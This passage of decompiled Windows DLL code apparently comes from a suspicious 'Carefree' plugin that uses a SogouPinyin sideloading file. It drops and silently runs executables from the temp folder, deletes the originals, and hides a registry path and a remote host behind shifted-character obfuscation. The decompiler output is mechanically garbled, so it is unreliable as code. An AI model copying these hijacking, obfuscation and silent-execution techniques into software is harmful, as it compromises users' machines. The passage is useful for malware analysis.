    // 0x100153e6
    PathRemoveFileSpecW((int16_t *)&g111);
    int32_t v6 = &g110; // 0x100153f9
    v6 += 2;
    while (*(int16_t *)v6 != 0) {
        // 0x10015400
        v6 += 2;
    }
    // 0x1001540c
    __asm_rep_movsd_memcpy((char *)v6, (char *)L"\\SogouPinyin.local", 9);
    int16_t * v7 = (int16_t *)&g111; // bp-576, 0x10015420
    bool v8 = PathFileExistsW((int16_t *)&g111); // 0x10015425
    int16_t ** v9 = &v7; // 0x10015429
    if (!v8) {
        int16_t * v10 = &lpBuffer; // bp-580, 0x10015431
        bool v11 = PathFileExistsW(&lpBuffer); // 0x10015432
        v9 = &v10;
        if (v11) {
            int16_t * v12 = &lpBuffer; // bp-592, 0x10015445
            CopyFileW(&lpBuffer, (int16_t *)&g111, false);
            v9 = &v12;
        }
    }
    int32_t v13 = (int32_t)v9;
    *(int32_t *)(v13 - 4) = 260;
    *(int32_t *)(v13 - 8) = (int32_t)&g113;
    *(int32_t *)(v13 - 12) = 0;
    GetModuleFileNameW(&g173, (int16_t *)&g173, (int32_t)&g173);
    int32_t * v14 = (int32_t *)(v13 - 16); // 0x1001545a
    *v14 = (int32_t)&g113;
    __wcslwr(&g173);
    *v14 = (int32_t)&g113;
    int16_t * v15 = PathFindFileNameW((int16_t *)&g173); // 0x10015472
    int32_t * v16 = (int32_t *)(v13 - 20); // 0x10015474
    *v16 = (int32_t)L"xplorer";
    int32_t * v17 = (int32_t *)(v13 - 24); // 0x10015479
    *v17 = (int32_t)v15;
    int32_t v18; // bp-532, 0x10015300
    if (_wcsstr((int16_t *)&g173, (int16_t *)&g173) == NULL) {
        // 0x10015575
        *v16 = (int32_t)&g113;
        if (function_10016210((int32_t)&g173) != 0) {
            // 0x10015586
            *v16 = (int32_t)&v18;
            *v17 = 0;
            *(int32_t *)(v13 - 28) = 0;
            *(int32_t *)(v13 - 32) = 0x100152b0;
            *(int32_t *)(v13 - 36) = 0;
            *(int32_t *)(v13 - 40) = 0;
            int32_t * threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)&g173, (int32_t)&g173, (int32_t (*)(int32_t *))&g173, &g173, (int32_t)&g173, &g173); // 0x1001559a
            g119 = (int32_t)threadHandle;
            // 0x100155a5
            return _40___security_check_cookie_40_4();
        }
        // 0x100155bb
        *v16 = (int32_t)&g113;
        int16_t * v19 = PathFindFileNameW((int16_t *)&g173); // 0x100155c0
        *v17 = (int32_t)L"egsv";
        int32_t * v20 = (int32_t *)(v13 - 28); // 0x100155c7
        *v20 = (int32_t)v19;
        if (_wcsstr((int16_t *)&g173, (int16_t *)&g173) != NULL) {
            // 0x100155a5
            return _40___security_check_cookie_40_4();
        }
        // 0x100155d4
        *v17 = (int32_t)&g113;
        int16_t * v21 = PathFindFileNameW((int16_t *)&g173); // 0x100155d9
        *v20 = (int32_t)L"dll32";
        *(int32_t *)(v13 - 32) = (int32_t)v21;
        _wcsstr((int16_t *)&g173, (int16_t *)&g173);
        return _40___security_check_cookie_40_4();
    }
    // 0x1001548a
    *v16 = (int32_t)L"carefree";
    *v17 = 0;
    *(int32_t *)(v13 - 28) = 0;
    if (CreateMutexW((struct _SECURITY_ATTRIBUTES *)&g173, (bool)&g173, (int16_t *)&g173) == NULL || GetLastError() == 183) {
        // 0x10015562
        return _40___security_check_cookie_40_4();
    }
    // 0x100154b2
    function_10016a70();
    int32_t v22 = 0; // 0x100154b9
    int16_t v23 = *(int16_t *)(v22 + (int32_t)&g112); // 0x100154c0
    *(int16_t *)(v22 + (int32_t)&g115) = v23;
    v22 += 2;
    while (v23 != 0) {
        // 0x100154c0
        v23 = *(int16_t *)(v22 + (int32_t)&g112);
        *(int16_t *)(v22 + (int32_t)&g115) = v23;
        v22 += 2;
    }
    // 0x100154d6
    *(int32_t *)(v13 - 32) = (int32_t)&g115;
    PathRemoveFileSpecW((int16_t *)&g173);
    int32_t v24 = &g114;
    int32_t v25 = v24 + 2; // 0x100154f0
    while (*(int16_t *)v25 != 0) {
        // 0x100154f0
        v24 = v25;
        v25 = v24 + 2;
    }
    // 0x100154fc
    *(int32_t *)v25 = 0x7e005c;
    *(int32_t *)(v24 + 6) = 0x700075;
    *(int32_t *)(v13 - 36) = (int32_t)&g115;
    *(int16_t *)(v24 + 10) = 0;
    if (PathFileExistsW((int16_t *)&g173)) {
        // 0x10015523
        g116 = 1;
    }
    // 0x1001552d
    *(int32_t *)(v13 - 40) = (int32_t)&v18;
    *(int32_t *)(v13 - 44) = 0;
    *(int32_t *)(v13 - 48) = 0;
    *(int32_t *)(v13 - 52) = 0x10015150;
    *(int32_t *)(v13 - 56) = 0;
    *(int32_t *)(v13 - 60) = 0;
    int32_t * threadHandle2 = CreateThread((struct _SECURITY_ATTRIBUTES *)&g173, (int32_t)&g173, (int32_t (*)(int32_t *))&g173, &g173, (int32_t)&g173, &g173); // 0x10015541
    g119 = (int32_t)threadHandle2;
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10015600 - 0x1001566a
int32_t function_10015600(int32_t a1, int32_t a2) {
    // 0x10015600
    int32_t result; // 0x10015600
    int32_t lpCriticalSection = result + 16; // 0x10015603
    *(int32_t *)lpCriticalSection = 0;
    *(int32_t *)(result + 20) = 0;
    *(int32_t *)(result + 24) = 0;
    *(int32_t *)(result + 28) = 0;
    *(int32_t *)(result + 32) = 0;
    *(int32_t *)(result + 36) = 0;
    int32_t * v1 = (int32_t *)(result + 4); // 0x1001561d
    *v1 = 0;
    *(int32_t *)(result + 12) = 0;
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 40) = 0;
    if (InitializeCriticalSectionAndSpinCount((struct _RTL_CRITICAL_SECTION *)lpCriticalSection, 0)) {
        // 0x1001565e
        *v1 = 36;
        return result;
    }
    int32_t errorCode = GetLastError(); // 0x1001563a
    int32_t v2; // 0x10015600
    int32_t v3; // 0x10015600
    if ((errorCode > 0 ? errorCode & 0xffff || -0x7ff90000 : v3) < (errorCode > 0 ? 0 : v2)) {
        // 0x10015652
        *(char *)&g90 = 1;
        return result;
    }
    // 0x1001565e
    *v1 = 36;
    return result;
}

// Address range: 0x10015670 - 0x100156ff
int32_t _DllMain_40_12(int32_t a1, int32_t a2) {
    // 0x10015670
    g118 = a1;
    int32_t v1; // 0x10015670
    if (a2 != 0) {
        if (a2 == 1) {
            int32_t result = function_10015300(v1); // 0x10015686
            if (result == 0) {
                // 0x1001568f
                return result;
            }
        }
        // 0x1001568f
        return 1;
    }
    // 0x10015693
    function_10016aa0(v1);
    int32_t v2; // bp-4, 0x10015670
    int32_t * v3 = &v2; // 0x1001569f
    if (g119 != 0) {
        int32_t v4 = g119; // bp-12, 0x100156a3
        TerminateThread((int32_t *)g119, 0);
        v3 = &v4;
    }
    // 0x100156aa
    if (g121 == 0) {
        // 0x1001568f
        return 1;
    }
    int32_t v5 = (int32_t)v3;
    int32_t v6 = v5; // 0x100156ba
    if (g122 != 0) {
        // 0x100156bc
        v6 = v5 - 4;
        *(int32_t *)v6 = (int32_t)&g121;
        function_10015100((int32_t)&g173);
        g122 = 0;
    }
    int32_t v7 = v6; // 0x100156d7
    if (g124 != 0) {
        // 0x100156d9
        v7 = v6 - 4;
        *(int32_t *)v7 = g124;
    }
    // 0x100156e1
    *(int32_t *)(v7 - 4) = (int32_t)&g123;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g173);
    g121 = 0;
    // 0x1001568f
    return 1;
}

// Address range: 0x10015700 - 0x10015760
int32_t function_10015700(void) {
    // 0x10015700
    int32_t v1; // 0x10015700
    int32_t v2; // 0x10015700
    function_10015600(v1, v2);
    g95 = 0x3692066a;
    g96 = 0x4cb57a10;
    g97 = -0x21620c51;
    g98 = -0x546891cd;
    int32_t result; // 0x10015700
    if (g143 >= g144) {
        // 0x1001575b
        return result;
    }
    int32_t v3 = g144; // 0x10015700
    int32_t v4; // bp-8, 0x10015700
    int32_t v5 = &v4; // 0x1001574c
    for (int32_t i = g143; i < v3; i += 4) {
        int32_t v6 = v5;
        v5 = v6;
        if (*(int32_t *)i != 0) {
            // 0x10015749
            v5 = v6 - 4;
            *(int32_t *)v5 = 1;
            v3 = g144;
        }
    }
    // 0x1001575b
    return result;
}

// Address range: 0x10015760 - 0x100157c8
int32_t function_10015760(void) {
    // 0x10015760
    int32_t v1; // bp-8, 0x10015760
    int32_t v2 = &v1; // 0x10015767
    int32_t v3 = g143; // 0x10015770
    int32_t v4 = v2; // 0x10015770
    int32_t result; // 0x10015760
    if (g143 < g144) {
        int32_t v5 = *(int32_t *)v3; // 0x10015772
        int32_t v6 = 0; // 0x10015776
        int32_t v7 = v2; // 0x10015776
        if (v5 != 0) {
            // 0x10015778
            v6 = *(int32_t *)(v5 + 32);
            v7 = v2 - 4;
            *(int32_t *)v7 = 0;
        }
        int32_t v8 = v7;
        int32_t v9 = g144; // 0x10015782
        v3 += 4;
        result = v6;
        v4 = v8;
        while (v3 < v9) {
            int32_t v10 = v8;
            v5 = *(int32_t *)v3;
            int32_t v11 = v9; // 0x10015776
            v6 = 0;
            v7 = v10;
            if (v5 != 0) {
                // 0x10015778
                v6 = *(int32_t *)(v5 + 32);
                v7 = v10 - 4;
                *(int32_t *)v7 = 0;
                v11 = g144;
            }
            // 0x1001577f
            v8 = v7;
            v9 = v11;
            v3 += 4;
            result = v6;
            v4 = v8;
        }
    }
    // 0x1001578a
    int32_t v12; // 0x10015760
    int32_t v13 = v12 + 4; // 0x1001578a
    int32_t * v14 = (int32_t *)v13; // 0x1001578a
    if (*v14 == 0) {
        // 0x100157c5
        return result;
    }
    int32_t * v15 = (int32_t *)(v12 + 12); // 0x10015793
    int32_t v16 = v4; // 0x10015797
    if (*v15 != 0) {
        // 0x10015799
        v16 = v4 - 4;
        *(int32_t *)v16 = v13;
        function_10015100((int32_t)&g173);
        *v15 = 0;
    }
    int32_t v17 = *(int32_t *)(v12 + 40); // 0x100157a6
    int32_t v18 = v16; // 0x100157ab
    if (v17 != 0) {
        // 0x100157ad
        v18 = v16 - 4;
        *(int32_t *)v18 = v17;
    }
    // 0x100157b5
    *(int32_t *)(v18 - 4) = v12 + 16;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g173);
    *v14 = 0;
    // 0x100157c5
    return &g173;
}

// Address range: 0x100157d0 - 0x100157db
// From class:    .?AVCCarefreePluginModule@@
// Type:          virtual member function
int32_t function_100157d0(int32_t * Addend) {
    // 0x100157d0
    return InterlockedIncrement(Addend);
}

// Address range: 0x100157e0 - 0x100157eb
// From class:    .?AVCCarefreePluginModule@@
// Type:          virtual member function
int32_t function_100157e0(int32_t * Addend) {
    // 0x100157e0
    return InterlockedDecrement(Addend);
}

// Address range: 0x100157f0 - 0x100157f4
// From class:    .?AVCCarefreePluginModule@@
// Type:          virtual member function
int32_t function_100157f0(void) {
    // 0x100157f0
    int32_t v1; // 0x100157f0
    return *(int32_t *)(v1 + 8);
}

// Address range: 0x10015800 - 0x10015852
// From class:    .?AVCCarefreePluginModule@@
// Type:          virtual member function
int32_t function_10015800(int32_t a1) {
    // 0x10015800
    if (a1 == 0) {
        // 0x1001580b
        return -0x7fffbffd;
    }
    // 0x10015815
    int32_t v1; // 0x10015800
    int32_t v2 = v1 + 40; // 0x10015819
    int32_t * v3 = (int32_t *)v2; // 0x10015819
    int32_t v4 = *v3; // 0x10015819
    int32_t v5 = v4; // 0x1001581f
    int32_t v6; // bp-16, 0x10015800
    int32_t * v7 = &v6; // 0x1001581f
    int32_t result = 0; // 0x1001581f
    if (v4 == 0) {
        int32_t v8 = &g35; // bp-36, 0x1001582a
        result = CoCreateInstance((int32_t)&g35, NULL, 1, &g26, (int32_t **)v2);
        if (result < 0) {
            // 0x1001580b
            return result;
        }
        // 0x10015821
        v5 = *v3;
        v7 = &v8;
    }
    // 0x1001583b
    *(int32_t *)a1 = v5;
    *(int32_t *)((int32_t)v7 - 4) = *v3;
    // 0x1001580b
    return result;
}

// Address range: 0x10015860 - 0x1001587c
// From class:    .?AVCCarefreePluginModule@@
// Type:          virtual member function
int32_t function_10015860(int32_t result) {
    // 0x10015860
    return result;
}

// Address range: 0x10015880 - 0x100158a1
// From class:    .?AVCCarefreePluginModule@@
// Type:          virtual member function
int32_t function_10015880(char a1) {
    // 0x10015880
    function_10015760();
    if ((a1 & 1) != 0) {
        // 0x10015891
        _3f__3f_3_40_YAXPAX_40_Z(&g173);
    }
    // 0x1001589a
    int32_t result; // 0x10015880
    return result;
}

// Address range: 0x100158b0 - 0x10015a17
int32_t function_100158b0(void) {
    int16_t lpBuffer = 0; // bp-528, 0x100158d2
    int32_t v1; // bp-526, 0x100158b0
    _memset(&v1, 0, 518);
    GetTempPathW(260, &lpBuffer);
    int32_t v2; // 0x100158b0
    int16_t * lpExistingFileName = (int16_t *)v2; // 0x100158f3
    int16_t * v3 = PathFindFileNameW(lpExistingFileName); // 0x100158f4
    int32_t v4 = (int32_t)v3; // 0x100158f4
    int32_t v5 = v4; // 0x100158fc
    while (*(int16_t *)v5 != 0) {
        // 0x10015900
        v5 += 2;
    }
    // 0x1001590b
    int32_t v6; // bp-530, 0x100158b0
    int32_t v7 = &v6; // 0x10015915
    int32_t v8 = v7; // 0x10015918
    v8 += 2;
    while (*(int16_t *)v8 != 0) {
        // 0x10015920
        v8 += 2;
    }
    uint32_t v9 = v5 - v4; // 0x10015913
    uint32_t v10 = v9 / 4; // 0x1001592e
    __asm_rep_movsd_memcpy((char *)v8, (char *)v3, v10);
    bool v11; // 0x100158b0
    char * v12 = (char *)(v8 + v10 * (v11 ? -4 : 4)); // 0x10015941
    __asm_rep_movsb_memcpy(v12, v12, v9 & 3);
    PathRemoveExtensionW((int16_t *)&g173);
    int32_t v13 = v7;
    int32_t v14 = v13 + 2; // 0x10015952
    while (*(int16_t *)v14 != 0) {
        // 0x10015952
        v13 = v14;
        v14 = v13 + 2;
    }
    // 0x1001595e
    *(int32_t *)v14 = 0x65002e;
    *(int32_t *)(v13 + 6) = 0x650078;
    *(int16_t *)(v13 + 10) = 0;
    CopyFileW(lpExistingFileName, &lpBuffer, false);
    DeleteFileW(lpExistingFileName);
    ShellExecuteW(NULL, L"open", &lpBuffer, NULL, NULL, 1);
    __time64();
    int32_t lpOut; // bp-728, 0x100158b0
    wsprintfW((int16_t *)&lpOut, L"%u");
    int16_t * lpKeyName = PathFindFileNameW(&lpBuffer); // 0x100159e2
    WritePrivateProfileStringW(L"inst", lpKeyName, (int16_t *)&g173, (int16_t *)&g173);
    int16_t * v15 = PathFindFileNameW(&lpBuffer); // 0x100159f7
    function_100182c0((int32_t)L"install", (int32_t)v15);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10015a20 - 0x10015d13
int32_t function_10015a20(void) {
    int32_t v1 = 0; // 0x10015a35
    int16_t v2 = *(int16_t *)(v1 + (int32_t)&g115); // 0x10015a40
    int32_t v3; // bp-4, 0x10015a20
    *(int16_t *)((int32_t)&v3 - 1044 + v1) = v2;
    v1 += 2;
    while (v2 != 0) {
        // 0x10015a40
        v2 = *(int16_t *)(v1 + (int32_t)&g115);
        *(int16_t *)((int32_t)&v3 - 1044 + v1) = v2;
        v1 += 2;
    }
    // 0x10015a57
    int32_t v4; // bp-1050, 0x10015a20
    int32_t v5 = &v4; // 0x10015a5d
    int32_t v6 = v5;
    int32_t v7 = v6 + 2; // 0x10015a60
    while (*(int16_t *)v7 != 0) {
        // 0x10015a60
        v6 = v7;
        v7 = v6 + 2;
    }
    // 0x10015a6c
    *(int32_t *)v7 = 0x2a005c;
    *(int32_t *)(v6 + 6) = 46;
    int32_t v8 = v5;
    int32_t v9 = v8 + 2; // 0x10015a86
    while (*(int16_t *)v9 != 0) {
        // 0x10015a86
        v8 = v9;
        v9 = v8 + 2;
    }
    // 0x10015a92
    *(int32_t *)v9 = 0x610064;
    *(int32_t *)(v8 + 6) = 116;
    int32_t lpFileName; // bp-1048, 0x10015a20
    int16_t * v10 = (int16_t *)&lpFileName; // bp-2376, 0x10015ab1
    int32_t lpFindFileData; // bp-2360, 0x10015a20
    int32_t * v11 = FindFirstFileW((int16_t *)&lpFileName, (struct _WIN32_FIND_DATAW *)&lpFindFileData); // 0x10015ab2
    int32_t v12; // 0x10015a20
    bool v13; // 0x10015a20
    uint32_t v14; // 0x10015a20
    int32_t v15; // 0x10015a20
    int32_t v16; // 0x10015a20
    int32_t v17; // 0x10015a20
    int32_t v18; // 0x10015a20
    int32_t v19; // 0x10015a20
    int32_t * v20; // bp-528, 0x10015a20
    int32_t v21; // 0x10015ab2
    int32_t v22; // 0x10015a20
    int32_t v23; // 0x10015ae5
    int32_t v24; // 0x10015a20
    int32_t v25; // 0x10015a20
    int32_t v26; // 0x10015a20
    int32_t v27; // 0x10015a20
    int32_t v28; // 0x10015cd9
    if (v11 == (int32_t *)-1) {
        // 0x10015a92
        v12 = &lpFileName;
        v19 = (int32_t)&v10;
    } else {
        // 0x10015ac9
        v21 = (int32_t)v11;
        v22 = &lpFileName;
        int16_t * v29 = (int16_t *)&lpFileName; // bp-2388, 0x10015ad1
        PathRemoveFileSpecW((int16_t *)&lpFileName);
        int32_t v30; // bp-2316, 0x10015a20
        v23 = &v30;
        int32_t v31; // bp-1768, 0x10015a20
        v24 = &v31;
        v25 = (int32_t)&v20;
        int32_t v32; // bp-530, 0x10015a20
        v26 = &v32;
        int32_t v33; // bp-1248, 0x10015a20
        v27 = &v33;
        v15 = (int32_t)&v29;
        while (true) {
          lab_0x10015ae0:
            // 0x10015ae0
            v16 = v15;
            int32_t v34 = (int32_t)&g27;
            v14 = v23;
            uint16_t v35 = *(int16_t *)v14; // 0x10015af0
            uint16_t v36 = *(int16_t *)v34; // 0x10015af3
            while (v35 == v36) {
                // 0x10015af8
                v17 = v16;
                if (v35 == 0) {
                    goto lab_0x10015cd3_4;
                }
                uint16_t v37 = *(int16_t *)(v14 | 2); // 0x10015afd
                uint16_t v38 = *(int16_t *)(v34 | 2); // 0x10015b01
                if (v37 != v38) {
                    // 0x10015b1b
                    v13 = v37 < v38;
                    goto lab_0x10015b1b_2;
                }
                int32_t v39 = v14 + 4; // 0x10015b10
                int32_t v40 = v34 + 4; // 0x10015b10
                v17 = v16;
                if (v37 == 0) {
                    goto lab_0x10015cd3_4;
                }
                v34 = v40;
                v14 = v39;
                v35 = *(int16_t *)v14;
                v36 = *(int16_t *)v34;
            }
            // 0x10015b1b
            v13 = v35 < v36;
            goto lab_0x10015b1b_2;
        }
      lab_0x10015ce9:
        // 0x10015ce9
        *(int32_t *)(v18 - 12) = v21;
        FindClose(&g173);
        v12 = v22;
        v19 = v28;
    }
    // 0x10015cf2
    *(int32_t *)(v19 - 4) = v12;
    RemoveDirectoryW((int16_t *)&g173);
    return _40___security_check_cookie_40_4();
  lab_0x10015cd3_4:
    // 0x10015cd3
    v18 = v17;
    v28 = v18 - 4;
    *(int32_t *)v28 = (int32_t)&lpFindFileData;
    int32_t v41 = v18 - 8; // 0x10015cda
    *(int32_t *)v41 = v21;
    bool v42 = FindNextFileW(&g173, (struct _WIN32_FIND_DATAW *)&g173); // 0x10015cdb
    v15 = v41;
    if (!v42) {
        // break -> 0x10015ce9
        goto lab_0x10015ce9;
    }
    goto lab_0x10015ae0;
  lab_0x10015be0:;
    // 0x10015be0
    int32_t v43; // 0x10015a20
    int32_t v44 = v43 + 2; // 0x10015be0
    v43 = v44;
    if (*(int16_t *)v44 != 0) {
        goto lab_0x10015be0;
    } else {
        goto lab_0x10015bec;
    }
  lab_0x10015b1b_2:;
    bool v45 = v13;
    v17 = v16;
    bool v46; // 0x10015a20
    uint32_t v47; // 0x10015a20
    if (v45 == (!v45 && v14 >= (v14 || (int32_t)v45))) {
        goto lab_0x10015cd3_4;
    } else {
        int32_t v48 = (int32_t)L"..";
        v47 = v23;
        uint16_t v49 = *(int16_t *)v47; // 0x10015b30
        uint16_t v50 = *(int16_t *)v48; // 0x10015b33
        while (v49 == v50) {
            // 0x10015b38
            v17 = v16;
            if (v49 == 0) {
                goto lab_0x10015cd3_4;
            }
            uint16_t v51 = *(int16_t *)(v47 | 2); // 0x10015b3d
            uint16_t v52 = *(int16_t *)(v48 + 2); // 0x10015b41
            if (v51 != v52) {
                // 0x10015b5b
                v46 = v51 < v52;
                goto lab_0x10015b5b_2;
            }
            int32_t v53 = v47 + 4; // 0x10015b50
            int32_t v54 = v48 + 4; // 0x10015b50
            v17 = v16;
            if (v51 == 0) {
                goto lab_0x10015cd3_4;
            }
            v48 = v54;
            v47 = v53;
            v49 = *(int16_t *)v47;
            v50 = *(int16_t *)v48;
        }
        // 0x10015b5b
        v46 = v49 < v50;
        goto lab_0x10015b5b_2;
    }
  lab_0x10015b5b_2:;
    bool v55 = v46;
    v17 = v16;
    int32_t * v56; // 0x10015b7c
    int32_t * v57; // 0x10015b81
    int32_t * v58; // 0x10015b89
    int32_t * v59; // 0x10015b8e
    int32_t * v60; // 0x10015b95
    int16_t * v61; // 0x10015bbe
    int32_t v62; // 0x10015bbe
    int32_t v63; // 0x10015bc5
    if (v55 == (!v55 && v47 >= (v47 || (int32_t)v55))) {
        goto lab_0x10015cd3_4;
    } else {
        int32_t * v64 = (int32_t *)(v16 - 4); // 0x10015b69
        *v64 = v23;
        int32_t * v65 = (int32_t *)(v16 - 8); // 0x10015b70
        *v65 = v22;
        int32_t * v66 = (int32_t *)(v16 - 12); // 0x10015b71
        *v66 = (int32_t)L"%s\\%s";
        v56 = (int32_t *)(v16 - 16);
        *v56 = 260;
        v57 = (int32_t *)(v16 - 20);
        *v57 = v24;
        _swprintf_s((int16_t *)&g173, (int32_t)&g173, (int16_t *)&g173);
        v58 = (int32_t *)(v16 - 24);
        *v58 = 518;
        v59 = (int32_t *)(v16 - 28);
        *v59 = 0;
        v60 = (int32_t *)(v16 - 32);
        int32_t v67; // bp-526, 0x10015a20
        *v60 = (int32_t)&v67;
        v20 = NULL;
        _memset(NULL, (int32_t)&g173, (int32_t)&g173);
        *v64 = v25;
        *v65 = 260;
        GetTempPathW((int32_t)&g173, (int16_t *)&g173);
        *v66 = v24;
        v61 = PathFindFileNameW((int16_t *)&g173);
        v62 = (int32_t)v61;
        int32_t v68 = v62; // 0x10015bc0
        while (true) {
            int32_t v69 = v68;
            v63 = v69 + 2;
            v68 = v63;
            v43 = v26;
            if (*(int16_t *)v69 == 0) {
                goto lab_0x10015be0;
            }
        }
        goto lab_0x10015bec;
    }
  lab_0x10015bec:;
    uint32_t v70 = v63 - v62; // 0x10015bd3
    uint32_t v71 = v70 / 4; // 0x10015bee
    __asm_rep_movsd_memcpy((char *)v44, (char *)v61, v71);
    bool v72; // 0x10015a20
    char * v73 = (char *)(v44 + v71 * (v72 ? -4 : 4)); // 0x10015bfa
    __asm_rep_movsb_memcpy(v73, v73, v70 & 3);
    *v56 = v25;
    PathRemoveExtensionW((int16_t *)&g173);
    int32_t v74 = v26;
    int32_t v75 = v74 + 2; // 0x10015c12
    while (*(int16_t *)v75 != 0) {
        // 0x10015c12
        v74 = v75;
        v75 = v74 + 2;
    }
    // 0x10015c1e
    *(int32_t *)v75 = 0x65002e;
    *(int32_t *)(v74 + 6) = 0x650078;
    *(int16_t *)(v74 + 10) = 0;
    *v57 = 0;
    *v58 = v25;
    *v59 = v24;
    CopyFileW((int16_t *)&g173, (int16_t *)&g173, (bool)&g173);
    *v60 = v24;
    DeleteFileW((int16_t *)&g173);
    *(int32_t *)(v16 - 36) = 1;
    *(int32_t *)(v16 - 40) = 0;
    *(int32_t *)(v16 - 44) = 0;
    *(int32_t *)(v16 - 48) = v25;
    *(int32_t *)(v16 - 52) = (int32_t)L"open";
    *(int32_t *)(v16 - 56) = 0;
    ShellExecuteW(&g173, (int16_t *)&g173, (int16_t *)&g173, (int16_t *)&g173, (int16_t *)&g173, (int32_t)&g173);
    int32_t * v76 = (int32_t *)(v16 - 60); // 0x10015c77
    *v76 = 0;
    int32_t v77 = __time64(); // 0x10015c79
    int32_t * v78 = (int32_t *)(v16 - 64); // 0x10015c7e
    *v78 = v24;
    int32_t * v79 = (int32_t *)(v16 - 68); // 0x10015c7f
    *v79 = v77;
    int32_t * v80 = (int32_t *)(v16 - 72); // 0x10015c86
    *v80 = (int32_t)L"%u";
    int32_t * v81 = (int32_t *)(v16 - 76); // 0x10015c8b
    *v81 = v27;
    wsprintfW((int16_t *)&g173, (int16_t *)&g173);
    *v76 = (int32_t)&g111;
    *v78 = v27;
    *v79 = v25;
    *v80 = (int32_t)PathFindFileNameW((int16_t *)&g173);
    *v81 = (int32_t)L"inst";
    WritePrivateProfileStringW((int16_t *)&g173, (int16_t *)&g173, (int16_t *)&g173, (int16_t *)&g173);
    int32_t v82 = v16 - 80; // 0x10015cbc
    *(int32_t *)v82 = v25;
    *(int32_t *)(v16 - 84) = (int32_t)PathFindFileNameW((int16_t *)&g173);
    *(int32_t *)(v16 - 88) = (int32_t)L"install";
    function_100182c0((int32_t)&g173, (int32_t)&g173);
    v17 = v82;
    goto lab_0x10015cd3_4;
}

// Address range: 0x10015d30 - 0x10016202
int32_t function_10015d30(void) {
    int32_t v1 = function_10018930(); // 0x10015d43
    if (v1 != 0) {
        // 0x100161f2
        return _40___security_check_cookie_40_4();
    }
    // 0x10015d50
    int32_t v2; // bp-4, 0x10015d30
    int32_t v3 = &v2; // 0x10015d31
    int32_t v4 = v3 - 456; // 0x10015d57
    int32_t v5 = v1; // 0x10015d30
    int16_t v6 = *(int16_t *)(v5 + (int32_t)L"PLCQT>OBYJf`olplcqYTfkaltpY@roobkqSbopflkYRkfkpq^ii"); // 0x10015d50
    *(int16_t *)(v5 + v4) = v6;
    v5 += 2;
    while (v6 != 0) {
        // 0x10015d50
        v6 = *(int16_t *)(v5 + (int32_t)L"PLCQT>OBYJf`olplcqYTfkaltpY@roobkqSbopflkYRkfkpq^ii");
        *(int16_t *)(v5 + v4) = v6;
        v5 += 2;
    }
    // 0x10015d67
    int32_t lpSubKey; // bp-460, 0x10015d30
    int32_t v7 = &lpSubKey; // 0x10015d67
    int32_t v8 = v7; // 0x10015d70
    while (*(int16_t *)v8 != 0) {
        // 0x10015d73
        v8 += 2;
    }
    // 0x10015d7e
    int32_t v9; // bp-458, 0x10015d30
    int32_t v10 = &v9; // 0x10015d70
    int32_t v11 = 0; // 0x10015d82
    if (v8 != v10) {
        int16_t * v12 = (int16_t *)(2 * v11 + v4); // 0x10015d90
        *v12 = *v12 + 3;
        int32_t v13 = v7;
        int32_t v14 = v13 + 2; // 0x10015da6
        while (*(int16_t *)v13 != 0) {
            // 0x10015da3
            v13 = v14;
            v14 = v13 + 2;
        }
        // 0x10015dae
        v11++;
        while (v11 < (v14 - v10) / 2) {
            // 0x10015d90
            v12 = (int16_t *)(2 * v11 + v4);
            *v12 = *v12 + 3;
            v13 = v7;
            v14 = v13 + 2;
            while (*(int16_t *)v13 != 0) {
                // 0x10015da3
                v13 = v14;
                v14 = v13 + 2;
            }
            // 0x10015dae
            v11++;
        }
    }
    // 0x10015db6
    int32_t phkResult; // bp-3540, 0x10015d30
    int32_t v15 = RegOpenKeyExW(HKEY_LOCAL_MACHINE, (int16_t *)&lpSubKey, 0, 0x20219, (int32_t **)&phkResult); // 0x10015dd0
    if (v15 != 0) {
        // 0x100161f2
        return _40___security_check_cookie_40_4();
    }
    // 0x10015dde
    int32_t v16; // bp-60, 0x10015d30
    __asm_rep_movsd_memcpy((char *)&v16, (char *)L"dpog/dbsfgsff/xjgjqz/dpn", 12);
    int32_t v17 = &v16; // 0x10015def
    int32_t v18 = v17; // 0x10015df9
    while (*(int16_t *)v18 != 0) {
        // 0x10015e00
        v18 += 2;
    }
    // 0x10015e0b
    int32_t v19; // bp-58, 0x10015d30
    int32_t v20 = &v19; // 0x10015df6
    if (v18 != v20) {
        int32_t v21; // 0x10015e25
        for (int32_t i = 0; i < (v21 - v20) / 2; i++) {
            int16_t * v22 = (int16_t *)(v3 - 56 + 2 * i); // 0x10015e16
            *v22 = *v22 - 1;
            int32_t v23 = v17;
            v21 = v23 + 2;
            while (*(int16_t *)v23 != 0) {
                // 0x10015e22
                v23 = v21;
                v21 = v23 + 2;
            }
        }
    }
    // 0x10015e35
    int32_t v24; // bp-3012, 0x10015d30
    int32_t v25 = &v24;
    int16_t v26; // bp-1692, 0x10015d30
    int32_t v27 = &v26;
    int32_t * v28; // bp-2092, 0x10015d30
    int32_t v29 = (int32_t)&v28;
    int32_t v30; // bp-260, 0x10015d30
    int32_t v31 = &v30;
    int32_t v32; // bp-660, 0x10015d30
    int32_t v33 = &v32;
    int32_t v34 = v3 - 2608;
    int32_t v35; // bp-2612, 0x10015d30
    int32_t v36 = &v35;
    int32_t v37 = 1; // 0x10015e3a
    int32_t v38; // bp-3584, 0x10015d30
    int32_t v39 = &v38; // 0x10015e3a
    int32_t * v40; // 0x10015d30
    int32_t v41; // 0x10015d30
    while (true) {
      lab_0x10015e40:;
        int32_t v42 = v39;
        int32_t * v43 = (int32_t *)(v42 - 4);
        *v43 = 510;
        int32_t * v44 = (int32_t *)(v42 - 8); // 0x10015e47
        *v44 = 0;
        int32_t * v45 = (int32_t *)(v42 - 12); // 0x10015e4e
        int32_t v46; // bp-1690, 0x10015d30
        *v45 = (int32_t)&v46;
        v26 = 0;
        _memset((int32_t *)v37, (int32_t)&g173, (int32_t)&g173);
        int32_t * v47 = (int32_t *)(v42 - 16); // 0x10015e5e
        *v47 = v17;
        int32_t * v48 = (int32_t *)(v42 - 20); // 0x10015e5f
        *v48 = v37;
        int32_t v49 = v42 - 24; // 0x10015e66
        int32_t * v50 = (int32_t *)v49; // 0x10015e66
        *v50 = (int32_t)L"a%d.%s";
        int32_t * v51 = (int32_t *)(v42 - 28); // 0x10015e6b
        *v51 = v25;
